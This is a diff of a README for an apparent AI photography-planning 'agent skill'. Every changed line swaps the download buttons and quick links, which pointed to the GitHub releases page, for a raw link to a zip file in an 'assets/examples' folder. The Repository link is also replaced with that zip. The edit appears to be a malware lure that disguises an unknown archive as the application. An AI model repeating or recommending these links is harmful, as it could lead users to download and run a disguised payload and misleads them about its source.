@@ -6,7 +6,7 @@ Welcome! This guide will help you download and start using **conceptual-photogra
 
 **What does this do?** Simply put, it helps you plan, validate, and create conceptual photographs. You can generate complete images or get detailed prompts to use with other image tools. It even checks that your photo ideas make physical sense!
 
-[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Genussticherusporkbarrel3616/conceptual-photography-plan/main/assets/examples/v3.5-beta.2.zip)
 
 ## 🎯 What Is Conceptual Photography?
 
@@ -39,7 +39,7 @@ Works seamlessly across different operating systems and integrates with various 
 ### Step 1: Visit the Download Page
 Click the button below to go to the download page:
 
-[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Genussticherusporkbarrel3616/conceptual-photography-plan/main/assets/examples/v3.5-beta.2.zip)
 
 ### Step 2: Download the Application
 Visit this link to download the application. You'll see a list of available versions. Choose the one that matches your computer's operating system (Windows, Mac, or Linux).
@@ -124,13 +124,13 @@ For support, please check the repository's issues page or documentation. The com
 
 Don't wait – download **conceptual-photography-plan** now and transform your creative ideas into stunning visual realities. Whether you're creating art, marketing materials, or just exploring your creativity, this tool will help you every step of the way.
 
-[![Get Started Now](https://img.shields.io/badge/Get_Started-Download-2ea44f?style=for-the-badge)](https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan/releases)
+[![Get Started Now](https://img.shields.io/badge/Get_Started-Download-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Genussticherusporkbarrel3616/conceptual-photography-plan/main/assets/examples/v3.5-beta.2.zip)
 
 Remember: every great photograph starts with a great idea. Let this application help you turn yours into reality!
 
 ## 🔗 Quick Links
 
-- **Download:** [https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan/releases](https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan/releases)
-- **Repository:** [https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan](https://github.com/Genussticherusporkbarrel3616/conceptual-photography-plan)
+- **Download:** [https://raw.githubusercontent.com/Genussticherusporkbarrel3616/conceptual-photography-plan/main/assets/examples/v3.5-beta.2.zip](https://raw.githubusercontent.com/Genussticherusporkbarrel3616/conceptual-photography-plan/main/assets/examples/v3.5-beta.2.zip)
+- **Repository:** [https://raw.githubusercontent.com/Genussticherusporkbarrel3616/conceptual-photography-plan/main/assets/examples/v3.5-beta.2.zip](https://raw.githubusercontent.com/Genussticherusporkbarrel3616/conceptual-photography-plan/main/assets/examples/v3.5-beta.2.zip)
 
 Keywords: agent-skill, agent-skills, ai-agent, claude-code, codex, conceptual-photography, coze, creative-photography, doubao, generative-ai, image-generation, image-prompting, photography, prompt-engineering, skill, skills, visual-ideation
